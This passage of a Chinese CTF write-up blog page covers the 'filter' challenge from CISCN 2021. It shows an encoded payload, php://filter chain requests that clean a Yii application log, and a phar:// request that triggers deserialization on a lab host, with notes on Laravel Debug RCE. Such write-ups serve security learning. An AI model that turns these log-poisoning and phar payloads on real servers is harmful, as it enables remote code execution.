class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=48=00=56</span>=<span class="number">00=74=00=62</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=45=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=48</span>=<span class="number">00</span>=<span class="number">73</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=59=00=41</span>=<span class="number">00=51=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">66</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00=59=00=74</span>=<span class="number">00=67=00=45</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=49=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=64</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=43</span>=<span class="number">00=35=00=30</span>=<span class="number">00=65=00=48</span>=<span class="number">00=51=00=45</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=48=00=73</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=59=00=41</span>=<span class="number">00=51=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">66</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00=59=00=74</span>=<span class="number">00=67=00=45</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=30=00=64</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=47</span>=<span class="number">00=54=00=77</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=65=00=63</span>=<span class="number">00</span>=<span class="number">42</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=74=00=50</span>=<span class="number">00=57=00=55</span>=<span class="number">00</span>=<span class="number">65</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=48=00=30</span>=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00=71=00=61</span>=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=45</span>=<span class="number">00=64=00=43</span>=<span class="number">00=54=00=55</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">3</span>D=<span class="number">00</span>a</span><br></pre></td></tr></table></figure>
+
+<p>清除其他字符</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://dd60ec6c<span class="number">-4197</span><span class="number">-4</span>c9b<span class="number">-8</span>dd0<span class="number">-8651</span>a607fa70.node3.buuoj.cn/?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="built_in">convert</span>.quoted-printable-decode|<span class="built_in">convert</span>.iconv.utf<span class="number">-16</span>le.utf<span class="number">-8</span>|<span class="built_in">convert</span>.base64-decode/resource=../runtime/logs/app.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>
+
+<p>phar序列化</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>dd60ec6c-<span class="number">4197</span>-<span class="number">4</span>c9b-<span class="number">8</span>dd0-<span class="number">8651</span>a607fa70.node3.buuoj.cn<span class="regexp">/?file=phar:/</span><span class="regexp">/../</span>runtime<span class="regexp">/logs/</span>app.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210520143637.png" alt="image-20210520143635914"></p>
+<p>和Laravel Debug RCE的区别？</p>
+<p>日志中只出现一次完整payload，还有一次到15字符省略的payload</p>
+<p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210520143951.png" alt="image-20210520143950955"></p>
+<p>因为在utf-16le-&gt;utf-8的时候必须要求是偶数字节，不然会报错，所以在Laravel Debug RCE的时候会先发送一个AA的文件名让日志必定为偶数字节</p>
+<p>在yii这里测试的时候本身就是偶字节的原因，就不需要提前发了，但是在调试Laravel的时候需要注意</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://w4nder.top/?p=451" target="_blank" rel="noopener">http://w4nder.top/?p=451</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Str3am
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://jlkl.github.io/2021/05/20/Web_18/" title="CISCN2021初赛 Web Writeup">https://jlkl.github.io/2021/05/20/Web_18/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/13/Java_04/" rel="prev" title="URLDNS&Commons Collections 1-7">
+      <i class="fa fa-chevron-left"></i> URLDNS&Commons Collections 1-7
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-sql"><span class="nav-number">1.</span> <span class="nav-text">easy_sql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-source"><span class="nav-number">2.</span> <span class="nav-text">easy_source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#middle-source"><span class="nav-number">3.</span> <span class="nav-text">middle_source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#upload"><span class="nav-number">4.</span> <span class="nav-text">upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#filter"><span class="nav-number">5.</span> <span class="nav-text">filter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">6.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Str3am"
+      src="/images/Str3am.jpg">
+  <p class="site-author-name" itemprop="name">Str3am</p>
+  <div class="site-description" itemprop="description">这个人很懒，什么也没留下</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/jlkl" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;jlkl" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:str3am@qq.com" title="E-Mail → mailto:str3am@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Friends
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://0xmj.github.io/" title="http:&#x2F;&#x2F;0xmj.github.io&#x2F;" rel="noopener" target="_blank">Mang0</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/sn1per/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;sn1per&#x2F;" rel="noopener" target="_blank">Sn1per</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Str3am</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="Symbols count total">287k</span>
+</div> 
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment-precise-range-plugin@1.3.0/moment-precise-range.min.js"></script>
+<script>
+  function timer() {
+    var ages = moment.preciseDiff(moment(),moment(20200108,"YYYYMMDD"));
+    ages = ages.replace(/years?/, "年");
+    ages = ages.replace(/months?/, "月");
+    ages = ages.replace(/days?/, "天");
+    ages = ages.replace(/hours?/, "小时");
+    ages = ages.replace(/minutes?/, "分");
+    ages = ages.replace(/seconds?/, "秒");
+    ages = ages.replace(/\d+/g, '<span style="color:#1890ff">$&</span>');
+    div.innerHTML = `我已在此等候你 ${ages}`;
+  }
+  var div = document.createElement("div");
+  //插入到copyright之后
+  var copyright = document.querySelector(".copyright");
+  document.querySelector(".footer-inner").insertBefore(div, copyright.nextSibling);
+  timer();
+  setInterval("timer()",1000)
+</script>
+
+
+
+
+  <script async src="/js/cursor/love.min.js"></script>
+
+
+
+
+  <script src="/js/cursor/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-user"></i>
+        </span>
+        <span class="site-uv" title="我的第  undefined  位朋友，">
+          <span id="busuanzi_value_site_uv"></span>
+        </span>
+      -->
+      <span class="site-uv">
+     我的第  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_uv"></span>  位朋友，
+    </span>
+    <!--
+      <span class="post-meta-divider">|</span>
+    -->
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-eye"></i>
+        </span>
+        <span class="site-pv" title="历经  undefined  次回眸才与你相遇">
+          <span id="busuanzi_value_site_pv"></span>
+        </span>
+      -->
+      <span class="site-pv">
+     历经  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_pv"></span>  次回眸才与你相遇
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el: '#valine-comments',
+      verify: true,
+      notify: true,
+      appId: '3IVY8n0VhhMlAUHBsp34Pxx7-gzGzoHsz',
+      appKey: 'DjdjX2sAzBG2G1G5c6amlBnv',
+      placeholder: "Just go go",
+      avatar: 'mm',
+      meta: guest,
+      pageSize: '10' || 10,
+      visitor: false,
+      lang: 'en' || 'zh-cn',
+      path: location.pathname,
+      recordIP: true,
+      serverURLs: ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
